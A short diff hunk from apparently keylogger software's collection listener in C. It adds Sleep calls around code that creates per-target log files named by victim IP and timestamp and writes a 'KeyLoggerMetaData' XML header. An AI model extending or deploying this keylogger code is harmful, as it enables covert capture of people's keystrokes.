@@ -73,13 +73,16 @@ void Listener()
             {
                 Sleep(1);
                 GetSystemTime(&timestamp);
-                Sleep(1); 
+                Sleep(1);
                 sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
+                Sleep(1);
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                                FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                                FILE_ATTRIBUTE_NORMAL,NULL);
+                Sleep(1);
             }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
+
             SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
              WriteFile(link->FileDescriptor,
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
